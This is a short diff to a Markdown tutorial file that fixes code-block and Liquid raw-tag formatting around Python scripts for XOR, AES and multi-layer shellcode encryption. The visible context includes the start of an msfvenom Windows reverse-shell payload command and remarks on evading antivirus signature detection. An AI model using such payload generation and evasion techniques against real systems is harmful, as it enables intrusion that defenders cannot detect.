@@ -589,7 +589,7 @@ msfvenom -p windows/x64/shell_reverse_tcp \
 **Step 2: Python XOR Encryptor — `xor_encrypt.py`**
 ```liquid
 {% raw %}
-```bash
+
 #!/usr/bin/env python3
 """
 XOR Shellcode Encryptor
@@ -755,9 +755,9 @@ While XOR can evade basic signature matching, sophisticated AV engines can brute
 - **PKCS7 padding** handles shellcode that isn't a multiple of 16 bytes
 
 **Step 1: Python AES Encryptor — `aes_encrypt.py`**
-
+```liquid
 {% raw %}
-```python
+
 #!/usr/bin/env python3
 """
 AES-256-CBC Shellcode Encryptor
@@ -1058,8 +1058,9 @@ Base64 decode (layer 3) → AES decrypt (layer 2) → XOR decrypt (layer 1) → 
 ```
 
 **Python Multi-Layer Encryptor — `multilayer_encrypt.py`:**
+```liquid
 {% raw %}
-```python
+
 #!/usr/bin/env python3
 """
 Multi-Layer Shellcode Encryptor
